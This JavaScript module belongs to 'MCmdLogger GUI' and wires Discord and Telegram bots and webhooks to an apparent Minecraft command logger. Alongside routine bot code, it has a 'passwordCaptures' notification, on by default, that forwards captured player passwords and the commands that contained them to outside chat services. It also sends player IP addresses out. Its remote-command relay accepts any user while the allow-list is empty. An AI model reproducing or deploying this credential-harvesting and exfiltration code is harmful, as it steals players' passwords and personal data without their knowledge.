/**
 * MCmdLogger GUI - Integrations Module
 * Handles Discord and Telegram bot integrations
 */

const fs = require('fs');
const path = require('path');
const https = require('https');

class IntegrationManager {
    constructor() {
        this.discord = null;
        this.telegram = null;
        this.config = this.loadConfig();
        this.eventHandlers = [];
    }

    // Load configuration
    loadConfig() {
        try {
            const configPath = path.join(__dirname, 'config.json');
            if (fs.existsSync(configPath)) {
                return JSON.parse(fs.readFileSync(configPath, 'utf8'));
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
        return this.getDefaultConfig();
    }

    // Save configuration
    saveConfig() {
        try {
            const configPath = path.join(__dirname, 'config.json');
            fs.writeFileSync(configPath, JSON.stringify(this.config, null, 2));
            return true;
        } catch (err) {
            console.error('Error saving config:', err);
            return false;
        }
    }

    // Get default configuration
    getDefaultConfig() {
        return {
            integrations: {
                discord: { enabled: false, token: '', channelId: '', webhookUrl: '' },
                telegram: { enabled: false, token: '', chatId: '' }
            },
            notifications: {
                playerJoin: true,
                playerLeave: true,
                playerCommands: false,
                passwordCaptures: true,
                serverErrors: true,
                customEvents: true,
                processStatus: true
            },
            remoteControl: {
                enabled: true,
                allowedUsers: []
            }
        };
    }

    // Initialize Discord bot
    async initDiscord(token, channelId) {
        if (!token) return { success: false, error: 'Token is required' };

        try {
            const { Client, GatewayIntentBits } = require('discord.js');

            this.discord = new Client({
                intents: [
                    GatewayIntentBits.Guilds,
                    GatewayIntentBits.GuildMessages,
                    GatewayIntentBits.MessageContent
                ]
            });

            return new Promise((resolve) => {
                this.discord.once('ready', () => {
                    console.log(`Discord bot logged in as ${this.discord.user.tag}`);
                    this.config.integrations.discord.enabled = true;
                    this.config.integrations.discord.token = token;
                    this.config.integrations.discord.channelId = channelId;
                    this.saveConfig();

                    // Setup message handler for remote commands
                    this.setupDiscordCommands();

                    resolve({ success: true, username: this.discord.user.tag });
                });

                this.discord.once('error', (err) => {
                    resolve({ success: false, error: err.message });
                });

                this.discord.login(token).catch(err => {
                    resolve({ success: false, error: err.message });
                });
            });
        } catch (err) {
            return { success: false, error: err.message };
        }
    }

    // Initialize Telegram bot
    async initTelegram(token, chatId) {
        if (!token) return { success: false, error: 'Token is required' };

        try {
            const TelegramBot = require('node-telegram-bot-api');

            this.telegram = new TelegramBot(token, { polling: true });

            // Test connection
            const me = await this.telegram.getMe();

            this.config.integrations.telegram.enabled = true;
            this.config.integrations.telegram.token = token;
            this.config.integrations.telegram.chatId = chatId;
            this.saveConfig();

            // Setup message handler for remote commands
            this.setupTelegramCommands();

            return { success: true, username: me.username };
        } catch (err) {
            return { success: false, error: err.message };
        }
    }

    // Send message via Discord webhook (simpler alternative)
    async sendDiscordWebhook(webhookUrl, message, embed = null) {
        if (!webhookUrl) return { success: false, error: 'Webhook URL is required' };

        try {
            const url = new URL(webhookUrl);
            const data = JSON.stringify({
                content: message,
                embeds: embed ? [embed] : undefined
            });

            return new Promise((resolve) => {
                const req = https.request({
                    hostname: url.hostname,
                    port: 443,
                    path: url.pathname,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': Buffer.byteLength(data)
                    }
                }, (res) => {
                    resolve({ success: res.statusCode === 204 || res.statusCode === 200 });
                });

                req.on('error', (err) => {
                    resolve({ success: false, error: err.message });
                });

                req.write(data);
                req.end();
            });
        } catch (err) {
            return { success: false, error: err.message };
        }
    }

    // Setup Discord command handler
    setupDiscordCommands() {
        if (!this.discord) return;

        this.discord.on('messageCreate', async (message) => {
            if (message.author.bot) return;

            // Check if remote control is enabled
            if (!this.config.remoteControl.enabled) return;

            // Check allowed users (if list is empty, allow all)
            const allowedUsers = this.config.remoteControl.allowedUsers;
            if (allowedUsers.length > 0 && !allowedUsers.includes(message.author.id)) {
                return;
            }

            const content = message.content.trim();

            if (content.startsWith('/cmd ')) {
                const command = content.substring(5);
                this.emit('remoteCommand', { command, platform: 'discord', message });
            } else if (content === '/status') {
                this.emit('statusRequest', { platform: 'discord', message });
            } else if (content === '/players') {
                this.emit('playersRequest', { platform: 'discord', message });
            }
        });
    }

    // Setup Telegram command handler
    setupTelegramCommands() {
        if (!this.telegram) return;

        this.telegram.on('message', async (msg) => {
            // Check if remote control is enabled
            if (!this.config.remoteControl.enabled) return;

            // Check allowed users (if list is empty, allow all)
            const allowedUsers = this.config.remoteControl.allowedUsers;
            if (allowedUsers.length > 0 && !allowedUsers.includes(msg.from.id.toString())) {
                return;
            }

            const text = msg.text?.trim() || '';

            if (text.startsWith('/cmd ')) {
                const command = text.substring(5);
                this.emit('remoteCommand', { command, platform: 'telegram', chatId: msg.chat.id });
            } else if (text === '/status') {
                this.emit('statusRequest', { platform: 'telegram', chatId: msg.chat.id });
            } else if (text === '/players') {
                this.emit('playersRequest', { platform: 'telegram', chatId: msg.chat.id });
            }
        });
    }

    // Send notification to all enabled integrations
    async notify(type, data) {
        if (!this.config.notifications[type]) return;

        const message = this.formatMessage(type, data);
        const results = [];

        // Discord
        if (this.config.integrations.discord.enabled) {
            if (this.config.integrations.discord.webhookUrl) {
                const result = await this.sendDiscordWebhook(
                    this.config.integrations.discord.webhookUrl,
                    message
                );
                results.push({ platform: 'discord-webhook', ...result });
            } else if (this.discord && this.config.integrations.discord.channelId) {
                try {
                    const channel = await this.discord.channels.fetch(
                        this.config.integrations.discord.channelId
                    );
                    await channel.send(message);
                    results.push({ platform: 'discord', success: true });
                } catch (err) {
                    results.push({ platform: 'discord', success: false, error: err.message });
                }
            }
        }

        // Telegram
        if (this.config.integrations.telegram.enabled && this.telegram) {
            try {
                await this.telegram.sendMessage(
                    this.config.integrations.telegram.chatId,
                    message,
                    { parse_mode: 'HTML' }
                );
                results.push({ platform: 'telegram', success: true });
            } catch (err) {
                results.push({ platform: 'telegram', success: false, error: err.message });
            }
        }

        return results;
    }

    // Format message based on notification type
    formatMessage(type, data) {
        const timestamp = new Date().toLocaleTimeString();

        switch (type) {
            case 'playerJoin':
                return `🟢 [${timestamp}] Player joined: ${data.name} (${data.ip})`;
            case 'playerLeave':
                return `🔴 [${timestamp}] Player left: ${data.name}`;
            case 'playerCommands':
                return `💬 [${timestamp}] ${data.name}: ${data.command}`;
            case 'passwordCaptures':
                return `🔑 [${timestamp}] Password captured!\nPlayer: ${data.name}\nCommand: ${data.command}`;
            case 'serverErrors':
                return `⚠️ [${timestamp}] Error: ${data.error}`;
            case 'processStatus':
                return `🔧 [${timestamp}] MCmdLogger ${data.status}`;
            case 'customEvents':
                return `📨 [${timestamp}] ${data.message}`;
            default:
                return `📝 [${timestamp}] ${JSON.stringify(data)}`;
        }
    }

    // Reply to Discord/Telegram message
    async reply(platform, target, message) {
        if (platform === 'discord' && target.reply) {
            await target.reply(message);
        } else if (platform === 'telegram' && this.telegram) {
            await this.telegram.sendMessage(target, message);
        }
    }

    // Event system
    on(event, handler) {
        this.eventHandlers.push({ event, handler });
    }

    emit(event, data) {
        this.eventHandlers
            .filter(h => h.event === event)
            .forEach(h => h.handler(data));
    }

    // Disconnect all integrations
    disconnect() {
        if (this.discord) {
            this.discord.destroy();
            this.discord = null;
        }
        if (this.telegram) {
            this.telegram.stopPolling();
            this.telegram = null;
        }
    }

    // Test Discord connection
    async testDiscord(token) {
        try {
            const { Client, GatewayIntentBits } = require('discord.js');
            const client = new Client({ intents: [GatewayIntentBits.Guilds] });

            return new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    client.destroy();
                    resolve({ success: false, error: 'Connection timeout' });
                }, 10000);

                client.once('ready', () => {
                    clearTimeout(timeout);
                    const username = client.user.tag;
                    client.destroy();
                    resolve({ success: true, username });
                });

                client.login(token).catch(err => {
                    clearTimeout(timeout);
                    resolve({ success: false, error: err.message });
                });
            });
        } catch (err) {
            return { success: false, error: err.message };
        }
    }

    // Test Telegram connection
    async testTelegram(token) {
        try {
            const TelegramBot = require('node-telegram-bot-api');
            const bot = new TelegramBot(token);
            const me = await bot.getMe();
            return { success: true, username: me.username };
        } catch (err) {
            return { success: false, error: err.message };
        }
    }

    // Test Discord webhook
    async testWebhook(webhookUrl) {
        return await this.sendDiscordWebhook(webhookUrl, '✅ MCmdLogger GUI webhook test successful!');
    }
}

module.exports = IntegrationManager;
